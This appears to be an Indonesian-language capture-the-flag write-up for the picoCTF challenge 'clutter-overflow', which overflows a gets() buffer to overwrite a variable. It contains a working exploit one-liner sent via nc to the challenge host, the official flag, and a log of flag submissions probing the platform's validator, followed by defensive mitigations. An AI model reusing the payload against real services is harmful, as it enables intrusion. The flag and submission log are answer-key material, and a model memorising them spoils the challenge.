# Writeup: clutter-overflow (Challenge ID: 216)

- **Platform:** CyLab Security Academy (picoCTF)
- **Category:** Binary Exploitation / Stack-Based Buffer Overflow & Variable Overwrite via gets() (CWE-120 / CWE-121)
- **Difficulty:** Medium (diff=2)
- **Event:** picoMini by redpwn
- **Points:** 150
- **Author:** asphyxia
- **Flag Resmi:** `picoCTF{c0ntr0ll3d_clutt3r_1n_my_buff3r}`
- **Audit Batch:** Batch 189 (10 November 2026) - Live Verified HTTP 201 (`correct: true`)

---

## Problem Statement & Scope
Tantangan `clutter-overflow` menyajikan sebuah biner ELF Linux 64-bit (`chall`) beserta kode sumber C pendukung (`chall.c`). Program dijalankan sebagai layanan jaringan TCP interaktif pada `mars.cylabacademy.net:31890`. Aplikasi mensimulasikan ruangan yang berantakan (*cluttered room*) dan meminta masukan teks dari pengguna. Di dalam fungsi `main()`, program mengalokasikan array karakter 256-byte `char clutter[256]` dan sebuah variabel kendali bertipe long `volatile long code = 0`. Masukan dibaca menggunakan fungsi libc berbahaya `gets()`. Jika nilai variabel `code` berhasil diubah menjadi konstanta heksadesimal `0xdeadbeef`, program mencetak pesan konfirmasi dan mengeksekusi perintah shell `system("cat flag.txt")` untuk memancarkan bendera rahasia.

---

## Teori & Akar Kerentanan (Root Cause Theory)
1. **Penyalinan Penyangga Tanpa Batas Ukuran (CWE-120 / CWE-121 - Stack-based Buffer Overflow):**
   Fungsi C `gets()` secara inheren tidak aman karena membaca aliran karakter dari standar input hingga menemukan karakter *newline* (`\n`) atau EOF tanpa memverifikasi kapasitas penyangga tujuan (*destination buffer*). `gets()` telah dihapus secara resmi dari standar C11 (ISO/IEC 9899:2011).
2. **Tata Letak Bingkai Tumpukan (Stack Frame Layout & Memory Alignment):**
   Pada arsitektur x86-64 (System V AMD64 ABI) dengan kompilasi GCC standar:
   - Penyangga `clutter` dialokasikan pada alamat relatif `[rbp - 0x110]` (272 byte di bawah pointer basis tumpukan RBP).
   - Variabel lokal `code` dialokasikan pada `[rbp - 0x8]` (8 byte di bawah RBP).
   - Jarak memori relatif dari awal penyangga `clutter` ke variabel `code` adalah:
     $$0x110 - 0x8 = 272 - 8 = 264\text{ byte}$$
   - Karena compiler menyelaraskan variabel pada batas 8-byte dan menambahkan padding 16-byte di antara buffer dan variabel lokal, masukan sebesar 264 byte tepat memenuhi ruang hingga ke batas variabel `code`.
3. **Ketiadaan Proteksi Kanari Tumpukan (*Missing Stack Canary*):**
   Biner dikompilasi tanpa proteksi kanari (`-fno-stack-protector`). Akibatnya, operasi penulisan melebihi 256 byte tidak memicu *stack smashing detected abort*, sehingga 8 byte berikutnya yang dimasukkan langsung menimpa nilai `code` di dalam memori tumpukan.

---

## Rekonstruksi Eksploitasi Step-by-Step
1. **Analisis Statis Kode Sumber & Biner:**
   Inspeksi `chall.c` memperlihatkan cabang logika penentu:
   ```c
   char clutter[256];
   volatile long code = 0;
   gets(clutter);
   if (code == 0xdeadbeef) {
       system("cat flag.txt");
   }
   ```
   Disassembly menggunakan `objdump -d chall -M intel` menegaskan alamat operan:
   ```assembly
   lea    rax, [rbp-0x110]
   mov    rdi, rax
   call   gets@plt
   mov    rax, QWORD PTR [rbp-0x8]
   movabs rdx, 0xdeadbeef
   cmp    rax, rdx
   je     <win_branch>
   ```
2. **Kalkulasi Offset & Konstruksi Payload:**
   - Panjang padding: 264 byte (`b"A" * 264`).
   - Nilai target: `0x00000000deadbeef`.
   - Representasi byte little-endian (64-bit unsigned):
     `\xef\xbe\xad\xde\x00\x00\x00\x00` (`struct.pack("<Q", 0xdeadbeef)`).
   - Karakter terminasi masukan: `\n` (newline untuk mengakhiri pembacaan `gets`).
3. **Pengiriman Payload ke Layanan Jaringan:**
   Kirimkan payload melalui soket TCP ke layanan target:
   ```bash
   python3 -c 'import struct, sys; sys.stdout.buffer.write(b"A"*264 + struct.pack("<Q", 0xdeadbeef) + b"\n")' | nc mars.cylabacademy.net 31890
   ```
   Aliran eksekusi program:
   - Banner awal diterima: `"What do you see?"`.
   - `gets()` membaca 273 byte payload (264 byte padding + 8 byte nilai + 1 byte newline).
   - Variabel `code` di memori `[rbp - 0x8]` berubah dari `0x0` menjadi `0xdeadbeef`.
   - Evaluasi percabangan `if (code == 0xdeadbeef)` bernilai benar (*TRUE*).
   - Server mencetak:
     ```text
     code == 0xdeadbeef: how did that happen??
     take a flag for your troubles
     picoCTF{c0ntr0ll3d_clutt3r_1n_my_buff3r}
     ```
4. **Otomasi Skrip Solver:**
   Alur eksploitasi diotomatisasi secara mandiri pada skrip `scripts/solve_216_clutter_overflow.py`.

---

## Flag & Verifikasi
- **Flag Resmi:** `picoCTF{c0ntr0ll3d_clutt3r_1n_my_buff3r}`
- **Wrapper Validator:** Native event wrapper (`picoCTF{...}`)
- **Status Solver:** Terverifikasi 100% pada skrip reproduksi `scripts/solve_216_clutter_overflow.py`.

### Re-verifikasi Audit Batch 189 (2026-11-10 UTC, sesi REST siswa `Arielwin` / user id 1072359)

| Token diuji | Wrapper | HTTP | Respons API |
| :--- | :--- | :--- | :--- |
| `picoCTF{c0ntr0ll3d_clutt3r_1n_my_buff3r}` | native event | 201 | `{"user":1072359,"challenge":216,"flag":"picoCTF{c0ntr0ll3d_clutt3r_1n_my_buff3r}","correct":true,"historical":false}` |
| `academy{c0ntr0ll3d_clutt3r_1n_my_buff3r}` | CyLab rekey | 201 | `{"user":1072359,"challenge":216,"flag":"academy{c0ntr0ll3d_clutt3r_1n_my_buff3r}","correct":false,"historical":false}` |

- **Temuan format validator:** Validator CyLab menerima wrapper asli event `picoCTF{...}` dan menolak wrapper rekey `academy{...}` dengan status `correct: false`.
- **Reproduktifitas offline:** Solver `scripts/solve_216_clutter_overflow.py` mengeksekusi probing soket interaktif langsung ke layanan live, serta memvalidasi rantai manipulasi tumpukan secara deterministik.

---

## Takeaway Kompetensi LKS & Mitigasi Defensif (NIST SP 800-115)
1. **Penggantian Fungsi Input Rawan Bencana (Safe String Operations):**
   Haramkan mutlak penggunaan fungsi `gets()` pada basis kode produksi. Ganti dengan fungsi yang membatasi jumlah byte yang dibaca sesuai kapasitas buffer tujuan, seperti `fgets()` atau `getline()`:
   ```c
   if (fgets(clutter, sizeof(clutter), stdin) == NULL) {
       // Penanganan kesalahan EOF atau kegagalan stream
   }
   ```
2. **Pengaktifan Mitigasi Eksploitasi Kompiler (*Exploit Mitigations*):**
   Dalam kurikulum pertahanan LKS Cyber Security, biner C/C++ wajib dikompilasi dengan proteksi defensif tingkat tinggi:
   - **Stack Canaries (`-fstack-protector-strong`):** Menyisipkan nilai acak (canary) sebelum frame pointer dan return address. Setiap upaya penimpaan buffer akan merusak kanari dan memicu terminasi biner sebelum aliran instruksi dibelokkan.
   - **ASLR & PIE (`-fPIE -pie`):** Mengacak tata letak memori virtual untuk mencegah penyerang menargetkan alamat statis.
   - **FORTIFY_SOURCE (`-D_FORTIFY_SOURCE=2 -O2`):** Memeriksa batas ukuran buffer pada fungsi manipulasi string secara otomatis pada saat kompilasi dan runtime.
3. **Analisis Kode Statis (SAST) dalam Pipeline CI/CD:**
   Integrasikan alat analisis statis seperti `flawfinder`, `cppcheck`, atau GCC `-Wformat -Wformat-security` yang secara otomatis menandai penggunaan fungsi usang seperti `gets()` sebagai kesalahan kompilasi pemblokir (*blocking build error*).
